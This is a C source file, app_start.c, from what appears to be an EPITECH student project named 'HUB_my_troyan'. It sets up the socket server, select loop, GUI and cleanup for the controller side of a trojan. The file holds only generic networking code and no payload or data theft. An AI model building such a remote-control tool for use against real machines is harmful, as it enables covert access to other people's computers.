/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 app_start.c
*/

#include "troyan_server.h"

bool loop = true;

void app_stop(void)
{
    loop = false;
}

static int app_loop(app_t *app)
{
    server_t *server = &app->server;
    socket_t *client;
    int status = EXIT_SUCCESS;

    while (loop) {
        client = (server->client_connected) ? &server->client : NULL;
        if (client) {
            if (fd_select(&server->select, 3, client->fd, server->sock.fd,
                    STDIN_FILENO)) {
                status = EXIT_FAILURE;
                continue;
            }
        } else {
            if (fd_select(
                    &server->select, 2, server->sock.fd, STDIN_FILENO)) {
                status = EXIT_FAILURE;
                continue;
            }
        }
        if (server->select.status != 0) {
            if (app_process_fd(app) == EXIT_FAILURE) {
                break;
            }
        }
    }
    return status;
}

static void app_destroy(app_t *app)
{
    if (app->server.client_connected) {
        socket_close(&app->server.client);
    }
    socket_close(&app->server.sock);
    gui_destroy(&app->gui);
}

static int app_init(app_t *app, uint port)
{
    app->server.client_connected = false;
    app->server.client.fd = -1;
    if (socket_server_create(&app->server.sock, port, MAX_CLIENT))
        return EXIT_FAILURE;
    if (signal_init() == EXIT_FAILURE)
        return EXIT_FAILURE;
    if (gui_create(&app->gui) == EXIT_FAILURE)
        return EXIT_FAILURE;
    gui_event_resize_init(&app->gui);
    return EXIT_SUCCESS;
}

int app_start(uint port)
{
    app_t app;

    if (app_init(&app, port) == EXIT_FAILURE) {
        return EXIT_FAILURE;
    }
    if (app_loop(&app) == EXIT_FAILURE) {
        app_destroy(&app);
        return EXIT_FAILURE;
    }
    app_destroy(&app);
    return EXIT_SUCCESS;
}